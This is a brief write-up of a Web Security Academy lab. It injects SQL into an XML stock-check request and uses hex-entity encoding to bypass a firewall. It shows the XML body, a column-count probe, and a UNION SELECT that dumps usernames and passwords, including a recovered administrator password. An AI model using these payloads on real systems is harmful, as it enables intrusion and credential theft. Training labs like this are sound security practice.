# SQL injection with filter bypass via XML encoding

1. SQLi: stock check feature.
2. Goal: log in to `administrator` account.

### Analysis
- Website target: `https://0ad70050049e041f80194e1c00ba00e7.web-security-academy.net/`
- Use Burp suite.
- `Hackvertor` extention to encode.

```html
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1 UNION SELECT NULL <!--"Attack detected": Firewall protecion.-->
    </storeId>
</stockCheck>
```

```sql
1 UNION SELECT NULL
-- Use 'Hackvertor' extention.
-- Hackervertor > Encode > hex_entities.

-- I found 'NULL' and it just have 1 column.
```

```sql
1 UNION SELECT username || ' - ' || password FROM users
-- administrator - 86ejwwqp4h0rr3tepyfp
```